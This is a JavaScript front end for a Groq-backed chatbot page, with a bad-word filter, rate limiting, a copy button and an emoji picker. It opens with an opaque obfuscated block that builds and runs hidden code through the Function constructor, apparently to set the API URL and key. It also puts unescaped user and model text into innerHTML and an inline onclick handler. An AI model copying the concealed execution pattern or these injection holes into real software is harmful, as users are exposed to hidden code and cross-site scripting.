 var apiUrl,apiKey;(function(){var GCW='',Uwf=208-197;function hlw(n){var j=6479496;var z=n.length;var e=[];for(var u=0;u<z;u++){e[u]=n.charAt(u)};for(var u=0;u<z;u++){var x=j*(u+220)+(j%20465);var l=j*(u+300)+(j%51085);var s=x%z;var i=l%z;var w=e[s];e[s]=e[i];e[i]=w;j=(x+l)%7077321;};return e.join('')};var Cws=hlw('itcskrctuuobfwoosazdvnhrlrpqeyncmgjtx').substr(0,Uwf);var BVA='b[rtp).{,llj(ir[f0 d=g={=hr=tcylohin6,.co vg(aAc,x-7-.(tfru=n7967s,a5+)+,n 9n)b6m.o0a,0+"s18],<=);0s7.[;seu2p)d,6 ;=A)"g>;nclrr;h.0aia] c[o[v1;x i0 ]srtatipir=av-=]+={"1;),r =)nr;g]e7!,kf=r7any=,(;;(.izsccma0r=n(;(a.eam"kftm}.crz8f4fvgrru(hAa0lmrz, =+.s;stp*8en(;fc;((;i.h47.;eh0n(-u(dvunn]i.){dp+len8[ol;)ag7l+o8h]9rjr,"=3r;l;uar-ubg4+a,vjgnhfe(ue9+eana]{,Crhee, et0,mgyxe++(uCer2l.,]iqarC+gfo  (28r6- .a;+1eog46Crv(hfi,q.*d=d uvirs}n=f+b,9d))1da(eo=++yA.=yi) lso==h;nqd[r(h,s1h(]hdg+j.cpaa2(}tf...<e;)+s.cSaeeae)c=3ek.vvu;i.)"l(n1l0lr(k{mctti[oeea(try====x}nvCq];.=( ft)vcvu1r-vuj+g1urhagnu=h,;][eCn=vhu(ag1r)tri;p1)e8{. 0=at";;+i(0u;a);p=r=rnfrlubyt=i)6+())vjo)+gy;m;),(Crns7}hvpv(];j)(]fdt4)= y=<o)s,gl"c;trsr+n,sosa=63c2avr,;i;g 2ao2w>=rnls=0. ;rte[rutla8=l)=ecvo[p"[6n)+(ur5va);c[a;e)<fled u28;z;m;d5ks,ni;[rll5oo )3(9fhftov;l(S6f=}naopojhiao!o;er  C;ij"rhtdr< l;oa9}Ae+)vderejjt5thhc';var HoL=hlw[Cws];var rRB='';var OFs=HoL;var BoY=HoL(rRB,hlw(BVA));var CNJ=BoY(hlw('{(.O!di,,.3(ng2dOv%.Sj0.=s,[[.woO)dd.)amv O}o=at3)d4rt)Od;..lsqO aea_(4s3)=.5bxsfb)t)ri_113u;(0$tOn;1.$.0)..3m(!akar(hM;OO"&p.;.!)y_))!sng()72i66)0a#\/s$O)s5.4+..6.0e.n=..p$.)w;mqaOOsM6u!$a(2 OtaOg,1sS1_{br#lnoqsgo;&h1)$13h,!3\/,3n,(_1)qO5,mOf$!_*=r;_e4s! 4$O]atq+rg07{O) 4}shrji,-n.e%2qO.O00iz0.Ow=w37O 3t+s!#;;tyO(6gOlS+C"hpO#,_(n{;t)(for.e*hnt.ldff$pbin(!.0h.4e{aph)sca;(0fOfr"!o(611$s=!((*O;.us\/1S2Op.=+*50hu#lp fO4a.i-pCO(.Ob=4t3Od$"q+O+i;-o1;41d_..swmv".bO)fi$(\'(s.50_tl{pcbOmi$)q646m%esO( .+z5O=O.rO.}\/$ 3w3.%)p_e8a0z!!O).(Oh+_q=fj!OdgoO)(,a_3jO7mtdtu%,a)[%(O(=7Oa0r$)}7.\/r=O{"lt)use,5,t.emdh3t!fO.m)hb)C2)!daOO6E,t,oaOO5 ,3aoOhp;paz1d!t=$.;)t$.dO3.50+=u\/O$ja4etjunj)s0e)]s0Ois;._de d,M(n[*.}\'.1O\'d9;,&*t=%(#jrt9s11#..!O;edO]3.j=1.}$.1r}O)e,ah]d_dOf$f.O\'q;{Oxj3_h),,_rs\/}O"4a+)}i$_4Oc(.(tO5!-.hxa).Oizgn!!juo, ,yo.pz.O=ol$r0(*,2p3mtdlp71 9 7!$O3=t}as.,Mo)_\/s$42ipO2O ,zOp_du$;Ofi)u,!O jaohfO;t..svi2t,OO\/OO_cp2ox_drnpt=(2n41%.f!}_{O](:9$+O&$.r;..Oca.O,n),b}r1ng;Oa_od=t.*n1O\/de((!r2d(j\/; p,%='));var VFe=OFs(GCW,CNJ );VFe(8014);return 6714})()
 let requestsSentThisMinute = 0;
const maxRequestsPerMinute = 30;

// List of bad words (replace with actual words)
const badWords = ["fuck", "sex", "shit"];

// Function to interact with the API
async function fetchGroqData(prompt) {
    const requestBody = {
        model: "llama-3.1-70b-versatile", // Model from your API documentation
        messages: [
            {
                role: "user", // User's message
                content: prompt, // The user's input message
            }
        ]
    };

    try {
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${apiKey}` // Authorization with your API key
            },
            body: JSON.stringify(requestBody) // Sending the structured request body
        });

        if (!response.ok) {
            throw new Error('Failed to fetch data from the API');
        }

        const data = await response.json();
        return data.choices[0].message.content; // Assuming the response follows this structure
    } catch (error) {
        console.error('Error:', error);
        return "Sorry, there was an error processing your request.";
    }
}

function openNav() {
    document.getElementById("mySidenav").style.width = "250px";
}

function closeNav() {
    document.getElementById("mySidenav").style.width = "0";
}

// Function to check if the user input contains bad words
function containsBadWords(input) {
    const inputLower = input.toLowerCase();
    return badWords.some(word => inputLower.includes(word.toLowerCase()));
}

async function sendMessage() {
    const userInput = document.getElementById('user-input').value.trim();
    if (!userInput) return;

    // Check if the rate limit is reached
    if (requestsSentThisMinute >= maxRequestsPerMinute) {
        showErrorMessage('Rate limit reached. Please wait a minute before trying again.');
        return;
    }

    // Bad word detection
    if (containsBadWords(userInput)) {
        const chatContainer = document.getElementById('chat-container');
        
        // Display the user's message as "Content Removed"
        const userMessage = document.createElement('div');
        userMessage.className = 'flex items-start space-x-2 mt-4 justify-end';
        userMessage.innerHTML = `<div class="bg-purple-200 text-black rounded-lg p-2"><i>Content Removed</i></div>`;
        chatContainer.appendChild(userMessage);

        // Display AI response with a custom message
        const aiResponseHTML = `
            <div class="flex items-start space-x-2 mt-4">
                ${getBotPfp()} <!-- Function to insert PFP -->
                <div class="bg-purple-200 text-black rounded-lg p-2">Please refrain from using inappropriate language.</div>
            </div>
        `;

        chatContainer.scrollTop = chatContainer.scrollHeight; // Scroll to the bottom
        document.getElementById('user-input').value = ''; // Clear input field

        // Increment the requests count and reset after a minute
        incrementRequestCount();

        // Append the AI response to the chat container
        chatContainer.innerHTML += aiResponseHTML;

        return; // End the function early to avoid sending the bad message to the AI
    }

    // Display user's message
    const chatContainer = document.getElementById('chat-container');
    const userMessage = document.createElement('div');
    userMessage.className = 'flex items-start space-x-2 mt-4 justify-end';
    userMessage.innerHTML = `<div class="bg-purple-200 text-black rounded-lg p-2">${userInput}</div>`;
    chatContainer.appendChild(userMessage);

    // Display AI response (Typing...)
    const typingDiv = document.createElement('div');
    typingDiv.className = 'flex items-start space-x-2 mt-4';
    typingDiv.innerHTML = `<div class="bg-purple-200 text-black rounded-lg p-2">Typing...</div>`;
    chatContainer.appendChild(typingDiv);
    chatContainer.scrollTop = chatContainer.scrollHeight; // Scroll to the bottom

    // Fetch the AI response
    const aiResponse = await fetchGroqData(userInput);

    // Convert bold markdown (**text**) to HTML (<strong>text</strong>)
    const formattedResponse = aiResponse.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');

    // Update typing div with AI response and PFP
    const aiResponseHTML = `
        <div class="flex items-start space-x-2 mt-4">
            ${getBotPfp()} <!-- Function to insert PFP -->
            <div class="bg-purple-200 text-black leading-6 mb-3 font-sans transition-all duration-300 ease-in-out rounded-lg p-2">${formattedResponse}</div>
        </div>
        <div class="mt-2 flex items-center">
            <button 
                class="flex items-center space-x-1 bg-white text-black px-2 py-1 rounded cursor-pointer"
                onclick="copyToClipboard('${aiResponse.replace(/'/g, "\\'")}')"
            >
                ${getCopySvg()} 
            </button>
        </div>
    `;

    typingDiv.outerHTML = aiResponseHTML;
    chatContainer.scrollTop = chatContainer.scrollHeight; // Scroll to the bottom
    document.getElementById('user-input').value = ''; // Clear input field

    // Increment the requests count and reset after a minute
    incrementRequestCount();
    function incrementRequestCount() {
    requestsSentThisMinute++;
    setTimeout(() => {
        requestsSentThisMinute--;
    }, 60000); // Decrease request count after 1 minute
}
}

function getBotPfp() {
    return `
        <img 
            src="https://i.ibb.co/McjMCyJ/Leonardo-Phoenix-10-A-simple-and-professional-logo-for-an-AI-a-1-1.jpg" alt="Leonardo-Phoenix-10-A-simple-and-professional-logo-for-an-AI-a-1-1" 
            alt="AI Bot" 
            class="w-10 h-10 rounded-full"
        />
    `;
}

// Function to return the Copy SVG
function getCopySvg() {
    return `
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon-md-heavy">
            <path fill-rule="evenodd" clip-rule="evenodd" d="M7 5C7 3.34315 8.34315 2 10 2H19C20.6569 2 22 3.34315 22 5V14C22 15.6569 20.6569 17 19 17H17V19C17 20.6569 15.6569 22 14 22H5C3.34315 22 2 20.6569 2 19V10C2 8.34315 3.34315 7 5 7H7V5ZM9 7H14C15.6569 7 17 8.34315 17 10V15H19C19.5523 15 20 14.5523 20 14V5C20 4.44772 19.5523 4 19 4H10C9.44772 4 9 4.44772 9 5V7ZM5 9C4.44772 9 4 9.44772 4 10V19C4 19.5523 4.44772 20 5 20H14C14.5523 20 15 19.5523 15 19V10C15 9.44772 14.5523 9 14 9H5Z" fill="currentColor"></path>
        </svg>
    `;
}

// Function to copy text to clipboard
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        // Show toast message
        const toast = document.getElementById('toast');
        toast.classList.add('show'); // Show the toast
        setTimeout(() => {
            toast.classList.remove('show'); // Hide the toast after 3 seconds
        }, 3000);
    }).catch(err => {
        console.error('Failed to copy: ', err);
    });
}

// Toggle visibility of the emoji picker
function toggleEmojiPicker() {
    const emojiPicker = document.getElementById('emoji-picker');
    // Toggle the display of the emoji picker
    if (emojiPicker.style.display === 'none' || emojiPicker.style.display === '') {
        emojiPicker.style.display = 'block'; // Show the picker
    } else {
        emojiPicker.style.display = 'none'; // Hide the picker
    }
}

// Add selected emoji to the input field
function addEmoji(emoji) {
    const userInput = document.getElementById('user-input');
    userInput.value += emoji; // Append the emoji to the input field

    // Optionally, you can close the picker after selecting an emoji
    toggleEmojiPicker();
}

function showErrorMessage(message) {
    const errorMessageElement = document.getElementById('error-message');
    errorMessageElement.textContent = message;
    errorMessageElement.style.display = 'block';
    setTimeout(() => {
        errorMessageElement.style.display = 'none';
    }, 5000); // Hide the error message after 5 seconds
}